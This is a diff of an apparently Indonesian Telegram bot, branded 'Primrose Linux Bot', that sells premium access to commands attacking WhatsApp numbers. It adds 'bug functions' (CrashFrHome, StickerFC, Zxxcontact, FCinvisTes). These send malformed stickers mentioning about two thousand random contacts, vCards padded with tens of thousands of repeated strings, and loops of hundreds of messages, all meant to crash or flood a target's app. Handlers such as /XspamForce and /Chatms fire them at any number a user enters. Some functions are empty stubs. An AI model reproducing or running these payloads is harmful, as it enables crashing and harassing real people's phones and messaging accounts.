+        premiumUsers.push({ id: pollData.userId, expiresAt });
+    } else {
+        existing.expiresAt = expiresAt;
     }
+    savePremiumUsers();
+    safeSendMessage(pollData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${pollData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
+    delete pendingPremiumPoll[answer.poll_id];
 });
 
 // ================= CALLBACK QUERY HANDLER ================= //
@@ -2196,6 +1753,33 @@ Gunakan tools ini untuk testing dan debugging</blockquote>`
     await bot.answerCallbackQuery(query.id).catch(() => {});
 });
 
+// Poll color handler
+bot.on("poll_answer", async (answer) => {
+    const pollData = pendingColorPoll[answer.poll_id];
+    if (!pollData) return;
+    const selectedOption = answer.option_ids[0];
+    let selectedColor = "";
+    if (selectedOption === 0) selectedColor = "XRED";
+    else if (selectedOption === 1) selectedColor = "XBLUE";
+    else if (selectedOption === 2) selectedColor = "XGREEN";
+    else if (selectedOption === 3) selectedColor = "XWHITE";
+    else if (selectedOption === 4) selectedColor = "XDISCO";
+    const colorValue = getColorFromChoice(selectedColor);
+    saveColorSetting(colorValue);
+    currentColor = colorValue;
+    if (buttonIntervals.has(pollData.currentMessageId)) {
+        clearInterval(buttonIntervals.get(pollData.currentMessageId));
+        buttonIntervals.delete(pollData.currentMessageId);
+    }
+    if (globalIntervalId) {
+        clearInterval(globalIntervalId);
+        globalIntervalId = null;
+    }
+    discoActive = false;
+    await sendColoredMenu(pollData.chatId, pollData.from, colorValue, pollData.currentMessageId);
+    delete pendingColorPoll[answer.poll_id];
+});
+
 bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
     const from = msg.from;
@@ -2383,6 +1967,158 @@ bot.onText(/^add$/i, async (msg) => {
     safeSendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" });
 });
 
+// ================= BUG FUNCTIONS ================= //
+
+async function CrashFrHome(sock, target) {
+    try {
+        const stickerMsg = {
+            viewOnceMessage: {
+                message: {
+                    stickerMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+                        mimetype: "image/webp",
+                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+                        fileLength: { low: 1, high: 0, unsigned: true },
+                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                        isAnimated: true,
+                        contextInfo: {
+                            mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")],
+                        },
+                    },
+                },
+            },
+        };
+        await sock.sendMessage(target, stickerMsg);
+        console.log("✅ CrashFrHome sticker sent to:", target);
+        for (let i = 0; i < 1000; i++) {
+            await sock.sendMessage(target, {
+                viewOnceMessage: {
+                    message: {
+                        eventMessage: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: "33333333333333333@newsletter",
+                                newsletterName: "FrezeHomeAbouse",
+                            },
+                        },
+                    },
+                },
+            });
+            console.log(`📤 CrashFrHome sending to ${target} - iteration ${i + 1}`);
+            await sleep(50);
+        }
+    } catch (e) {
+        console.log("❌ Error in CrashFrHome:", e);
+    }
+}
+
+async function StickerFC(sock, target) {
+    try {
+        const message = {
+            "groupStatusMessageV2": {
+                "message": {
+                    "stickerMessage": {
+                        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                        "mimetype": "image/webp",
+                        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                        "fileLength": "10610",
+                        "mediaKeyTimestamp": "1775044724",
+                        "stickerSentTs": "1775044724091"
+                    }
+                }
+            }
+        };
+        await sock.relayMessage(target, message, {});
+        console.log("✅ StickerFC sent to:", target);
+    } catch (err) {
+        console.error("❌ Error StickerFC:", err);
+    }
+}
+
+async function Zxxcontact(sock, target) {
+    try {
+        const contactMessage = {
+            viewOnceMessage: {
+                message: {
+                    contactMessage: {
+                        displayName: "카나이 하티".repeat(20000),
+                        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + "카나이 하티".repeat(10000) + "\nORG:" + "아르케인 엑소시스트".repeat(10000) + "\nADR;TYPE=WORK:;;" + "서울특별시 강남구 테헤란로 101".repeat(10000) + ";;;\nTEL;type=CELL;waid=821012345678:" + "+821012345678".repeat(10000) + "\nNOTE:" + "관리자 전용 계정입니다.".repeat(20000) + "\nEND:VCARD"
+                    }
+                }
+            }
+        };
+        await sock.relayMessage(target, contactMessage, { participant: { jid: target } });
+        console.log("✅ Zxxcontact sent to:", target);
+    } catch (err) {
+        console.error("❌ Error Zxxcontact:", err);
+    }
+}
+
+async function FCinvisTes(sock, target) {
+    const message = {
+        "groupStatusMessageV2": {
+            "message": {
+                "stickerMessage": {
+                    "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                    "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                    "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                    "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                    "mimetype": "image/webp",
+                    "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                    "fileLength": "10610",
+                    "mediaKeyTimestamp": "1775044724",
+                    "stickerSentTs": "1775044724091"
+                }
+            }
+        }
+    };
+    return await sock.relayMessage(target, message, { participant: { jid: target } });
+}
+
+async function brem(sock, target) { }
+async function VisiFriend(sock, target) { }
+async function OfferXForclose(sock, target) { }
+async function bulldozerV2(sock, target) { }
+async function xatanicaldelayv2(sock, target) { }
+async function MbaPe(sock, target) { }
+
+function createBugSuccessMessage(targetNumber, bugType, date) {
+    return `
+<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
+
+◉ Target : ${targetNumber}
+◉ Type Bug : ${bugType}
+◉ Status : Successfully Send
+◉ Date Now : ${date}
+
+<blockquote>⸙ Spam Free at will</blockquote>`;
+}
+
+function createCheckButton(targetNumber) {
+    return { inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]] };
+}
+
+function getCurrentDate() {
+    return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+}
+
+async function checkUserAccess(userId, chatId, chatType, commandName) {
+    const isOwnerUser = isOwner(userId);
+    const isPremiumUser = isPremium(userId);
+    if (isCommandBlocked(commandName)) return false;
+    if (isOwnerUser) return true;
+    if (chatType === "private" && !isPremiumUser) {
+        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+        return false;
+    }
+    return true;
+}
+
 // ================= COMMAND /XspamForce ================= //
 bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
@@ -2397,27 +2133,12 @@ bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
     const target = `${targetNumber}@s.whatsapp.net`;
     const date = getCurrentDate();
     if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const activeSocket = await getActiveSocket();
-    if (!activeSocket) {
-        return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif. Mencoba reconnect...");
-    }
-    const sock = activeSocket.sock;
+    const sock = sessions.values().next().value;
     await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce (Anti Kenok)", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
     for (let i = 0; i < 500; i++) {
-        try {
-            await CrashFrHome(sock, target);
-            await StickerFC(sock, target);
-            console.log(`🚀 XspamForce iteration ${i + 1} to ${targetNumber}`);
-        } catch (error) {
-            console.error(`❌ XspamForce iteration ${i + 1} error:`, error.message);
-            // Cek koneksi dan coba reconnect jika perlu
-            if (error.message && error.message.includes("Connection closed")) {
-                const newActive = await getActiveSocket();
-                if (newActive) {
-                    sock = newActive.sock;
-                }
-            }
-        }
+        await CrashFrHome(sock, target);
+        await StickerFC(sock, target);
+        console.log(`🚀 XspamForce iteration ${i + 1} to ${targetNumber}`);
         await sleep(100);
     }
 });
@@ -2430,7 +2151,12 @@ bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
     if (!hasAccess) return;
     if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /xploit 628xxx");
     const targetNumber = match[1].replace(/[^0-9]/g, "");
-    await safeBugSender(chatId, targetNumber, "xploit", FCinvis, 1, 0);
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 1; i++) { await FCinvis(sock, target); }
 });
 
 bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
@@ -2441,7 +2167,12 @@ bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
     if (!hasAccess) return;
     if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
     const targetNumber = match[1].replace(/[^0-9]/g, "");
-    await safeBugSender(chatId, targetNumber, "Sanjiva", xatanicaldelayv2, 10, 100);
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 10; i++) { await xatanicaldelayv2(sock, target); await sleep(100); }
 });
 
 bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
@@ -2452,7 +2183,12 @@ bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
     if (!hasAccess) return;
     if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Stova 628xxx");
     const targetNumber = match[1].replace(/[^0-9]/g, "");
-    await safeBugSender(chatId, targetNumber, "Stova", brem, 7, 100);
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 7; i++) { await brem(sock, target); await sleep(100); }
 });
 
 bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
@@ -2463,7 +2199,12 @@ bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
     if (!hasAccess) return;
     if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Chatms 628xxx");
     const targetNumber = match[1].replace(/[^0-9]/g, "");
-    await safeBugSender(chatId, targetNumber, "Chatms", FCinvisTes, 500, 3000);
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 500; i++) { await FCinvisTes(sock, target); await sleep(3000); }
 });
 
 bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
@@ -2474,7 +2215,12 @@ bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
     if (!hasAccess) return;
     if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
     const targetNumber = match[1].replace(/[^0-9]/g, "");
-    await safeBugSender(chatId, targetNumber, "Ganesha", bulldozerV2, 10, 100);
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 10; i++) { await bulldozerV2(sock, target); await sleep(100); }
 });
 
 bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
@@ -2485,7 +2231,12 @@ bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
     if (!hasAccess) return;
     if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /sendbug 628xxx");
     const targetNumber = match[1].replace(/[^0-9]/g, "");
-    await safeBugSender(chatId, targetNumber, "sendbug", VisiFriend, 35, 100);
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 35; i++) { await VisiFriend(sock, target); await sleep(100); }
 });
 
 bot.onText(/\/reqpair (.+)/, async (msg, match) => {
@@ -2514,33 +2265,6 @@ process.on('unhandledRejection', (reason, promise) => {
 
 process.on('uncaughtException', (error) => {
     console.error(chalk.red('Uncaught Exception:', error));
-    // Jangan exit, biarkan bot tetap berjalan
-});
-
-process.on('SIGINT', () => {
-    console.log(chalk.yellow('\n🛑 Shutting down bot...'));
-    stopHealthCheck();
-    stopAutoUpdateChecker();
-    for (const [botNumber] of sessions) {
-        stopPingInterval(botNumber);
-    }
-    for (const [botNumber, timeout] of reconnectTimeouts) {
-        clearTimeout(timeout);
-    }
-    process.exit(0);
-});
-
-process.on('SIGTERM', () => {
-    console.log(chalk.yellow('\n🛑 Shutting down bot...'));
-    stopHealthCheck();
-    stopAutoUpdateChecker();
-    for (const [botNumber] of sessions) {
-        stopPingInterval(botNumber);
-    }
-    for (const [botNumber, timeout] of reconnectTimeouts) {
-        clearTimeout(timeout);
-    }
-    process.exit(0);
 });
 
 startAutoUpdateChecker();
